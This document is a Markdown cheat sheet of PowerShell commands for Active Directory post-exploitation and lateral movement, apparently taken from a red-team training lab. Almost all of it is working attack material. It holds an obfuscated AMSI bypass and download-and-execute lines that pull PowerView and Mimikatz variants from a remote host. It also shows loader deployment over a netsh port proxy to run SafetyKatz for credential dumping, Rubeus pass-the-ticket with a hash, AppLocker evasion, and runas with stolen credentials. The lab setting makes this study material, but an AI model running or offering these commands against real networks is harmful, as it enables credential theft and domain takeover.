
> [!NOTE] **NOTE**
> **REVIEW WHAT PRIVILEGES A USER HAS AFTER COMPROMISE** (BloodHound - PowerView)
> 
> ```powershell
>  Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
>  ```
>  
>  **Also search for Unconstrained and Constrained delegation abuse**


```powershell
ls env
```

```powershell
iex (iwr http://172.16.100.48/sbloggingbypass.txt -useb)
```

```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

Review AppLocker settings
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

```powershell
iex(iwr 'http://172.16.100.48/PowerView.ps1' -useb)
iex(iwr 'http://172.16.100.48/Invoke-SessionHunter.ps1' -useb)
iex(iwr 'http://172.16.100.48/Find-PSRemotingLocalAdminAccess.ps1' -useb)

iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.48/PowerView.ps1'))
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.48/Find-PSRemotingLocalAdminAccess.ps1'))
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.48/Invoke-SessionHunter.ps1'))
```

You must have administrator access to list sessions - netexec equivalent
```powershell
Find-DomainUserLocation
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose

winrs -r:dcorp-mgmt cmd /c "set computername && set username"
$null | winrs -r:dcorp-mgmt "powershell /c Get-Process -IncludeUserName"
```

### Lateral 1 (Local Admin)
Add port forward to machine to forwards to webserver - downloading executable is bad
```powershell
iwr http://172.16.100.48/Loader.exe -OutFile C:\Users\Public\Loader.exe

echo F | xcopy C:\Users\Public\Loader.exe \\mgmtsrv.tech.finance.corp\C$\Users\Public\Loader.exe

$null | winrs -r:mgmtsrv.tech.finance.corp "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1"
```

Download from local loopback
```powershell
$null | winrs -r:mgmtsrv.tech.finance.corp "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args sekurlsa::evasive-keys exit"

$null | winrs -r:mgmtsrv.tech.finance.corp powershell -c "iex (iwr http://172.16.100.1/sbloggingbypass.txt -useb);iex (iwr http://172.16.100.1/amsibypass.txt -useb);iex (iwr http://172.16.100.1/Invoke-MimiEx-vault.ps1 -useb);"
```

Note down the `aes256_hmac` and the cleartext credentials 
Use Rubues on attacking machine
```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args asktgt /user:techservice /aes256:7f6825f607e9474bcd6b9c684dc70f7c1ca977ade7bfd2ad152fd54968349deb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

This will create a logon type 9 so the new credentials will only be used when accessing domain resources

```powershell
net use A: \\TSCLIENT\Tools

A:\tools\InviShell\RunWithRegistryNonAdmin.bat
```

```powershell
cd C:\Users\Public; Import-Module .\PowerView.ps1, .\PowerHuntShares.psm1, .\Find-PSRemotingLocalAdminAccess.ps1, .\PowerUp.ps1, .\Invoke-SessionHunter.ps1
```

You must have administrator access to list sessions - netexec equivalent
```powershell
Find-DomainUserLocation
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose

winrs -r:dcorp-mgmt cmd /c "set computername && set username"
$null | winrs -r:dcorp-mgmt "powershell /c Get-Process -IncludeUserName"
```
### Lateral 2 (Local Admin + AppLocker)
Review AppLocker settings
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Copy to AppLocker safe folder - can't dot source
```powershell
copy C:\Users\Public\Invoke-MimiEx-keys.ps1 \\dcorp-adminsrv\c$\'Program Files'

copy C:\Users\Public\Invoke-MimiEx-vault.ps1 \\dcorp-adminsrv\c$\'Program Files'

.\Invoke-MimiEx-keys.ps1
.\Invoke-MimiEx-vault.ps1

& 'C:\Program Files\Invoke-MimiEx-keys.ps1'
& 'C:\Program Files\Invoke-MimiEx-vault.ps1'
```

> **Note**: If clear text creds are found, use `runas` to open cmd 
```powershell
runas /user:dcorp\srvadmin /netonly cmd
```

```powershell
A:\tools\InviShell\RunWithRegistryNonAdmin.bat
```

```powershell
Import-Module .\PowerView.ps1, .\PowerHuntShares.psm1, .\Find-PSRemotingLocalAdminAccess.ps1, .\PowerUp.ps1
```

You must have administrator access to list sessions - netexec equivalent
```powershell
Find-DomainUserLocation
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose

winrs -r:dcorp-mgmt cmd /c "set computername && set username"
$null | winrs -r:dcorp-mgmt "powershell /c Get-Process -IncludeUserName"
```